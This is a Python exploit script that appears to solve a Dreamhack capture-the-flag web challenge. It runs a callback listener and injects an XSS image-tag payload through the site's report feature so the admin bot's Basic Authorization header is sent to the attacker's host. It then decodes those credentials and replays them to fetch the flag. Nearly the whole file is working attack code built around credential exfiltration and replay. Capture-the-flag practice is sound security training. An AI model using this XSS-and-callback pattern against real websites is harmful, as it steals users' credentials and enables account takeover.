import base64
import re
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import quote

import requests


TARGET = "http://host3.dreamhack.games:8407"
CALLBACK_IP = "Ip"
CALLBACK_PORT = 8888

captured = {}


class CallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        authorization = self.headers.get("Authorization")

        print(f"\n[+] Callback: {self.client_address[0]}")
        print(f"[+] Path: {self.path}")
        print(f"[+] Authorization: {authorization}")

        captured["authorization"] = authorization

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, *_):
        pass


def receive_callback():
    server = HTTPServer(("0.0.0.0", CALLBACK_PORT), CallbackHandler)

    print(f"[+] Listening on 0.0.0.0:{CALLBACK_PORT}")
    server.handle_request()
    server.server_close()


def main():
    listener = threading.Thread(target=receive_callback, daemon=True)
    listener.start()

    xss = f'<img src="http://{CALLBACK_IP}:{CALLBACK_PORT}/capture">'
    report_path = f"/intro?name={quote(xss)}&detail=x"

    print(f"[+] Payload: {xss}")
    print("[+] Submitting report...")

    response = requests.post(
        f"{TARGET}/report",
        data={"path": report_path},
        timeout=10,
    )

    print(f"[+] Report response: {response.status_code}")

    listener.join(timeout=10)

    authorization = captured.get("authorization")

    if not authorization:
        print("[-] Authorization 헤더를 받지 못했습니다.")
        return

    if authorization.startswith("Basic "):
        encoded = authorization.removeprefix("Basic ")
        decoded = base64.b64decode(encoded).decode(errors="replace")
        print(f"[+] Decoded credentials: {decoded}")

    response = requests.get(
        f"{TARGET}/whoami",
        headers={"Authorization": authorization},
        timeout=10,
    )

    flag = re.search(r"DH\{[^}]+\}", response.text)

    if flag:
        print(f"[+] FLAG: {flag.group()}")
    else:
        print("[-] FLAG를 찾지 못했습니다.")
        print(response.text)


if __name__ == "__main__":
    main()